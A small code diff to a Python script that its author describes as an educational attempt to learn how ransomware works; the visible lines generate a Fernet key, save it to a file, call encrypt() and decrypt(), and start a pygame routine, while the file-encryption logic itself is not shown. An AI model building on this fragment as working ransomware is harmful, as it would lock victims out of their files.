@@ -1,10 +1,9 @@
 #This Code was maded only for edicational and learning purposes, i wanted to learn how ransomware works 
 import pygame
 import os
-import sys
 from cryptography.fernet import Fernet 
 
-key = Fernet.generate_key() #KEY TO ENCRYPT AND DECRYPT
+key = Fernet.generate_key() #KEY TO ENCRYPT AND DECRYPT (TEMPORAL FOR NOW)
 def encrypt():
  #save key
  with open("KEY", "wb") as file_key:
@@ -42,15 +41,6 @@ def decrypt():
 encrypt()
 decrypt()  
   
-
-
-
-
-
-
-
-
-
 def fazwin():
     pygame.init() #init pygame
     pygame.mixer.init() #init pygame audio module
